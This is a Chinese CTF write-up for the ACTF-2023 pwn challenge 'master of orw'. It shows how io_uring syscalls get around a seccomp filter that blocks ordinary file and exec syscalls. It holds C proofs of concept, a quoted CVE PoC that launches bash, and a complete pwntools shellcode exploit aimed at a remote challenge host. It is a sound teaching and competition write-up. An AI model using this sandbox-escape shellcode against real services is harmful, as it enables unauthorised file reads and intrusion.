# ACTF-2023 WP
## PWN
### master of orw
查看保护：

```shell
0000: 0x20 0x00 0x00 0x00000004  A = arch
0001: 0x15 0x00 0x19 0xc000003e  if (A != ARCH_X86_64) goto 0027
0002: 0x20 0x00 0x00 0x00000000  A = sys_number
0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
0004: 0x15 0x00 0x16 0xffffffff  if (A != 0xffffffff) goto 0027
0005: 0x15 0x15 0x00 0x00000000  if (A == read) goto 0027
0006: 0x15 0x14 0x00 0x00000001  if (A == write) goto 0027
0007: 0x15 0x13 0x00 0x00000002  if (A == open) goto 0027
0008: 0x15 0x12 0x00 0x00000011  if (A == pread64) goto 0027
0009: 0x15 0x11 0x00 0x00000012  if (A == pwrite64) goto 0027
0010: 0x15 0x10 0x00 0x00000013  if (A == readv) goto 0027
0011: 0x15 0x0f 0x00 0x00000014  if (A == writev) goto 0027
0012: 0x15 0x0e 0x00 0x00000028  if (A == sendfile) goto 0027
0013: 0x15 0x0d 0x00 0x0000002c  if (A == sendto) goto 0027
0014: 0x15 0x0c 0x00 0x0000002e  if (A == sendmsg) goto 0027
0015: 0x15 0x0b 0x00 0x0000003b  if (A == execve) goto 0027
0016: 0x15 0x0a 0x00 0x00000101  if (A == openat) goto 0027
0017: 0x15 0x09 0x00 0x00000127  if (A == preadv) goto 0027
0018: 0x15 0x08 0x00 0x00000128  if (A == pwritev) goto 0027
0019: 0x15 0x07 0x00 0x0000012f  if (A == name_to_handle_at) goto 0027
0020: 0x15 0x06 0x00 0x00000130  if (A == open_by_handle_at) goto 0027
0021: 0x15 0x05 0x00 0x00000142  if (A == execveat) goto 0027
0022: 0x15 0x04 0x00 0x00000147  if (A == preadv2) goto 0027
0023: 0x15 0x03 0x00 0x00000148  if (A == pwritev2) goto 0027
0024: 0x15 0x02 0x00 0x000001ac  if (A == 0x1ac) goto 0027
0025: 0x15 0x01 0x00 0x000001b5  if (A == 0x1b5) goto 0027
0026: 0x06 0x00 0x00 0x7fff0000  return ALLOW
0027: 0x06 0x00 0x00 0x00000000  return KILL
```

没有其他东西，就是绕过沙盒即可。

一看就是把已知的orw方式全部禁用了，基本上常用的不用考虑了，考虑一下异步io的方式，一开始想的很简单，就用库就行了，然后找每个函数的系统调用即可。然后写出了我们的第一版poc：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <liburing.h>
#define BUFFER_SIZE 1024

int main() {
    struct io_uring ring1, ring2, ring3;
    int ret;
    
    ret = io_uring_queue_init(16, &ring1, 0);
    struct io_uring_sqe *sqe1 = io_uring_get_sqe(&ring1);
    io_uring_prep_openat(sqe1, -100, "/flag", O_RDONLY, 0);
    ret = io_uring_submit(&ring1);
    struct io_uring_cqe *cqe1;
    ret = io_uring_wait_cqe(&ring1, &cqe1);
    int fd = cqe1->res;
    io_uring_queue_exit(&ring1);

    ret = io_uring_queue_init(16, &ring2, 0);
    struct io_uring_sqe *sqe2 = io_uring_get_sqe(&ring2);
    char buffer[BUFFER_SIZE];
    io_uring_prep_read(sqe2, fd, buffer, BUFFER_SIZE, 0);
    ret = io_uring_submit(&ring2);
    struct io_uring_cqe *cqe2;
    ret = io_uring_wait_cqe(&ring2, &cqe2);
    int bytes_read = cqe2->res;
    io_uring_queue_exit(&ring2);

    ret = io_uring_queue_init(16, &ring3, 0);
    struct io_uring_sqe *sqe3 = io_uring_get_sqe(&ring2);
    io_uring_prep_write(sqe3, STDOUT_FILENO, buffer, bytes_read, 0);
    ret = io_uring_submit(&ring2);
    struct io_uring_cqe *cqe3;
    ret = io_uring_wait_cqe(&ring2, &cqe3);
    io_uring_queue_exit(&ring3);
    close(fd);
    
    return 0;
}
```

只需要引入`liburing.h`库就行了，但是里面的函数调用全是封装好的，虽然确实能绕过，但是要是想改成只能使用系统调用的汇编指令，太麻烦了。我们gdb动调跟踪，发现其实主要就是使用了两个系统调用，0x1a9和0x1aa，其他的部分都是一些对于结构体的处理，也就是说，其实根本上就是使用这两个系统调用来实现的。

们先查资料，其实本质上来说这个库就是对于`io_uring`的封装，这两个最重要的系统调用就是`io_uring_setup`和`io_uring_enter`，

第一个是设置 `io_uring` 实例的系统调用

```c
 int io_uring_setup(unsigned entries, struct io_uring_params *params);
```

应用程序必须提供条目的数量`entries`给 io_uring 实例，并且提供相关的参数 `params`

- `entries`表示与 io_uring 相关联的 sqe 数量的平方数，他必须是 2 的幂，[1,4096]
- `params` 结构会被内核读取和写入

第二个是来通知内核，有请求需要处理

```C
int io_uring_enter(unsigned int fd, unsigned int to_submit, unsigned int min_complete, unsigned int flags, sigset_t sig);
```

- `fd` 指 `io_ursing_setup` 返回 `io_uring`的文件描述符
- `to_submit` 告诉内核准备消费的提交的`sqe`数量
- `min_complete` 要求内核等待请求完成数量
- `flags`包含用来修改调用行为的标识符

**只需要一次调用就完成了提交和等待完成，也就是说应用程序可以通过一个系统调用来提交并等待指定数量的请求完成**
其中还有一些我们需要用到的重要结构体的构造：

`io_uring` API 定义了下列 `mmap` 偏移量，以供应用使用

```c
#define IORING_OFF_SQ_RING OULL
#define IORING_OFF_CQ_RING 0x8000000ULL
#define IORING_OFF_SQES 0x10000000ULL
```

- `IORING_OFF_SQ_RING` 用于将 SQ 环映射到应用程序空间
- `IORING_OFF_CQ_RING` 用于 CQ 环
- `IORING_OFF_SQES` 映射 sqes 数组

然后呢？怎么写？还是不太会，但是我们可以去找前人的肩膀：

> https://bugs.chromium.org/p/project-zero/issues/detail?id=2011

这位大哥的代码是一个cve的poc，不是完全契合我们的要求，但是他是从底层实现了提交请求并完成调用，看看他的源代码：

```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <err.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include "linux/io_uring.h"

#ifndef SYS_io_uring_enter
#define SYS_io_uring_enter 426
#endif
#ifndef SYS_io_uring_setup
#define SYS_io_uring_setup 425
#endif

#define SYSCHK(x) ({          \
  typeof(x) __res = (x);      \
  if (__res == (typeof(x))-1) \
    err(1, "SYSCHK(" #x ")"); \
  __res;                      \
})

int main(void)
{
  // initialize uring
  struct io_uring_params params = {};
  int uring_fd = SYSCHK(syscall(SYS_io_uring_setup, /*entries=*/10, &params));
  unsigned char *sq_ring = SYSCHK(mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQ_RING));
  unsigned char *cq_ring = SYSCHK(mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_CQ_RING));
  struct io_uring_sqe *sqes = SYSCHK(mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQES));

  // execute openat via uring
  sqes[0] = (struct io_uring_sqe){
      .opcode = IORING_OP_OPENAT,
      .flags = IOSQE_ASYNC,
      .fd = open("/", O_RDONLY),
      .addr = (unsigned long)"/",
      .open_flags = O_PATH | O_DIRECTORY};
  ((int *)(sq_ring + params.sq_off.array))[0] = 0;
  (*(int *)(sq_ring + params.sq_off.tail))++;
  int submitted = SYSCHK(syscall(SYS_io_uring_enter, uring_fd, /*to_submit=*/1, /*min_complete=*/1, /*flags=*/IORING_ENTER_GETEVENTS, /*sig=*/NULL, /*sigsz=*/0));
  printf("submitted %d, getevents done\n", submitted);
  int cq_tail = *(int *)(cq_ring + params.cq_off.tail);
  printf("cq_tail = %d\n", cq_tail);
  if (cq_tail != 1)
    errx(1, "expected cq_tail==1");
  struct io_uring_cqe *cqe = (void *)(cq_ring + params.cq_off.cqes);
  if (cqe->res < 0)
  {
    printf("result: %d (%s)\n", cqe->res, strerror(-cqe->res));
  }
  else
  {
    printf("result: %d\n", cqe->res);
    printf("launching shell\n");
    system("bash");
    printf("exiting\n");
  }
}
```

我们根据我们的第一个poc去查看提交open请求时的构造源码：

```c
static inline void io_uring_prep_openat(struct io_uring_sqe *sqe, int dfd,
					const char *path, int flags, mode_t mode)
{
	io_uring_prep_rw(IORING_OP_OPENAT, sqe, dfd, path, mode, 0);
	sqe->open_flags = (__u32) flags;
}
```

再查看函数`io_uring_prep_rw`：

```c
static inline void io_uring_prep_rw(int op, struct io_uring_sqe *sqe, int fd,
				    const void *addr, unsigned len,
				    __u64 offset)
{
	sqe->opcode = (__u8) op;
	sqe->flags = 0;
	sqe->ioprio = 0;
	sqe->fd = fd;
	sqe->off = offset;
	sqe->addr = (unsigned long) addr;
	sqe->len = len;
	sqe->rw_flags = 0;
	sqe->user_data = 0;
	sqe->buf_index = 0;
	sqe->personality = 0;
	sqe->file_index = 0;
	sqe->__pad2[0] = sqe->__pad2[1] = 0;
}
```

因此我们修改`sqes[0]`处的结构体为：

```c
  sqes[0] = (struct io_uring_sqe){
      .opcode = IORING_OP_OPENAT,
      .flags = IOSQE_ASYNC,
      .addr = "/flag",
      .open_flags = O_RDONLY,
  };
```

然后再根据第一个poc的方式将`cqe->res`赋值给文件fd，我们得到如下代码：

```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <err.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include "linux/io_uring.h"

#ifndef SYS_io_uring_enter
#define SYS_io_uring_enter 426
#endif
#ifndef SYS_io_uring_setup
#define SYS_io_uring_setup 425
#endif

int main(void)
{
  // initialize uring
  struct io_uring_params params = {};
  int opened_fd;
  char buffer[100];
  int uring_fd = syscall(SYS_io_uring_setup, 16, &params);
  unsigned char *sq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQ_RING);
  unsigned char *cq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_CQ_RING);
  struct io_uring_sqe *sqes = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQES);

  sqes[0] = (struct io_uring_sqe){
      .opcode = IORING_OP_OPENAT,
      .flags = IOSQE_ASYNC,
      .addr = "/flag",
      .open_flags = O_RDONLY,
  };
  ((int *)(sq_ring + params.sq_off.array))[0] = 0;
  (*(int *)(sq_ring + params.sq_off.tail))++;
  syscall(SYS_io_uring_enter, uring_fd, 1, 1, IORING_ENTER_GETEVENTS, NULL, 0);
  struct io_uring_cqe *cqe = (void *)(cq_ring + params.cq_off.cqes);
  opened_fd = (int)cqe->res;
  read(opened_fd, buffer, 100);
  write(1, buffer, 100);
  return 0;
}
```

编译执行，发现打印出了flag，很好，那我们直接照猫画虎把整个orw都改成这样的格式：

```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <err.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include "linux/io_uring.h"

#ifndef SYS_io_uring_enter
#define SYS_io_uring_enter 426
#endif
#ifndef SYS_io_uring_setup
#define SYS_io_uring_setup 425
#endif

int main(void)
{
  // initialize uring
  struct io_uring_params params = {};
  int opened_fd;
  char buffer[100];
  int uring_fd = syscall(SYS_io_uring_setup, 16, &params);
  unsigned char *sq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQ_RING);
  unsigned char *cq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_CQ_RING);
  struct io_uring_sqe *sqes = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQES);

  sqes[0] = (struct io_uring_sqe){
      .opcode = IORING_OP_OPENAT,
      .flags = IOSQE_ASYNC,
      .addr = "/flag",
      .open_flags = O_RDONLY,
  };
  ((int *)(sq_ring + params.sq_off.array))[0] = 0;
  (*(int *)(sq_ring + params.sq_off.tail))++;
  syscall(SYS_io_uring_enter, uring_fd, 1, 1, IORING_ENTER_GETEVENTS, NULL, 0);
  struct io_uring_cqe *cqe = (void *)(cq_ring + params.cq_off.cqes);
  opened_fd = (int)cqe->res;

  sqes[0] = (struct io_uring_sqe){
      .opcode = IORING_OP_READ,
      .fd = opened_fd,
      .addr = buffer,
      .len = 100,
  };
  ((int *)(sq_ring + params.sq_off.array))[0] = 0;
  (*(int *)(sq_ring + params.sq_off.tail))++;
  syscall(SYS_io_uring_enter, uring_fd, 1, 1, IORING_ENTER_GETEVENTS, NULL, 0);

  sqes[0] = (struct io_uring_sqe){
      .opcode = IORING_OP_WRITE,
      .fd = 1,
      .addr = buffer,
      .len = 100,
  };
  ((int *)(sq_ring + params.sq_off.array))[0] = 0;
  (*(int *)(sq_ring + params.sq_off.tail))++;
  syscall(SYS_io_uring_enter, uring_fd, 1, 3, IORING_ENTER_GETEVENTS, NULL, 0);
  return 0;
}
```

然后编译执行后拿到了flag。

我们直接使用编译好的poc2，打开ida，照着写一遍，这里需要注意的是，我们需要利用寄存器中的残存地址去设置一下rbp的值即可。

完整exp：

```python
from pwn import *
context.arch = 'amd64'
# p = process('./pwn')
p = remote('120.46.65.156', 32101)
shellcode = asm("""
                mov rbp, rdx
                add rbp, 0xa00  
                mov rbx, rbp
                sub rbx, 0xf0  
                """)
shellcode += asm(shellcraft.syscall(425, 16, "rbx"))
shellcode += asm("""
                 sub rbx, 0x28
                 mov [rbx], rax
                 mov r13, rax 
                 """)
shellcode += asm(shellcraft.mmap(0, 1000, 3, 1, "r13", 0))
shellcode += asm("""
                 mov [rbp-0x110], rax
                 """)
shellcode += asm(shellcraft.mmap(0, 1000, 3, 1, "r13", 0x8000000))
shellcode += asm("""
                 mov [rbp-0x108], rax
                 """)
shellcode += asm(shellcraft.mmap(0, 1000, 3, 1, "r13", 0x10000000))
shellcode += asm("""
                 mov [rbp-0x100], rax
                 xor r13, r13
                 mov [rax], r13
                 mov [rax+8], r13
                 mov [rax+0x10], r13
                 mov [rax+0x18], r13
                 mov [rax+0x20], r13
                 mov [rax+0x28], r13
                 mov [rax+0x30], r13
                 mov [rax+0x38], r13
                 mov rax, [rbp-0x100]
                 mov byte ptr [rax], 0x12
                 mov byte ptr [rax+1], 0x10
                 mov rdx, 0x67616c662f
                 mov [rbp+0x100], rdx
                 mov rdx, rbp
                 add rdx, 0x100
                 mov [rax+0x10], rdx
                 mov eax, [rbp-0xB0]
                 mov edx, eax
                 mov rax, [rbp-0x110]
                 add rax, rdx
                 mov     [rax], r13
                 mov     eax, [rbp-0xC4]
                 mov     edx, eax
                 mov     rax, [rbp-0x110]
                 add     rax, rdx
                 mov     edx, [rax]
                 add     edx, 1
                 mov     [rax], edx
                 mov     r12, [rbp-0x118]
                 xor     rax, rax
                 sub     rsp, 8
                 push    0
                 """)
shellcode += asm(shellcraft.syscall(426, "r12", 1, 1, 1, 0, 0))
shellcode += asm("""
                 add rsp, 0x10
                 mov     eax, [rbp-0x8C]
                 mov     edx, eax
                 mov     rax, [rbp-0x108]
                 add     rax, rdx
                 mov     [rbp-0xF8], rax
                 mov     rax, [rbp-0xF8]
                 mov     eax, [rax+8]
                 mov     [rbp-0x114], eax
                 lea     rdx, [rbp-0x70]
                 mov     rax, [rbp-0x100]
                 mov [rax], r13
                 mov [rax+8], r13
                 mov [rax+0x10], r13
                 mov [rax+0x18], r13
                 mov [rax+0x20], r13
                 mov [rax+0x28], r13
                 mov [rax+0x30], r13
                 mov [rax+0x38], r13
                 mov rax, [rbp-0x100]
                 mov byte ptr [rax], 0x16
                 mov     ecx, [rbp-0x114]
                 mov     [rax+4], ecx
                 mov     [rax+0x10], rdx
                 mov     rbx, 0x64
                 mov     [rax+0x18], rbx
                 mov     edx, [rbp-0xB0]
                 mov     rax, [rbp-0x110]
                 add     rax, rdx
                 mov     [rax], r13             
                 mov     eax, [rbp-0xC4]    
                 mov     edx, eax
                 mov     rax, [rbp-0x110]
                 add     rax, rdx
                 mov     edx, [rax]
                 add     edx, 1
                 mov     [rax], edx
                 mov     r12, [rbp-0x118]
                 xor     rax, rax
                 sub     rsp, 8
                 push    0
                 """)
shellcode += asm(shellcraft.syscall(426, "r12", 1, 1, 1, 0, 0))
shellcode += asm("""
                 add rsp, 0x10
                 lea     rdx, [rbp-0x70]
                 mov     rax, [rbp-0x100]
                 mov [rax], r13
                 mov [rax+8], r13
                 mov [rax+0x10], r13
                 mov [rax+0x18], r13
                 mov [rax+0x20], r13
                 mov [rax+0x28], r13
                 mov [rax+0x30], r13
                 mov [rax+0x38], r13
                 mov rax, [rbp-0x100]
                 mov byte ptr [rax], 0x17
                 mov     ecx, 1
                 mov     [rax+4], ecx
                 mov     [rax+0x10], rdx
                 mov     rbx, 0x64
                 mov     [rax+0x18], rbx
                 mov     edx, [rbp-0xB0]
                 mov     rax, [rbp-0x110]
                 add     rax, rdx
                 mov     [rax], r13             
                 mov     eax, [rbp-0xC4]    
                 mov     edx, eax
                 mov     rax, [rbp-0x110]
                 add     rax, rdx
                 mov     edx, [rax]
                 add     edx, 1
                 mov     [rax], edx
                 mov     r12, [rbp-0x118]
                 xor     rax, rax
                 sub     rsp, 8
                 push    0
                 """)
shellcode += asm(shellcraft.syscall(426, "r12", 1, 3, 1, 0, 0))
print(hex(len(shellcode)))
p.sendline(shellcode)
p.interactive()
```

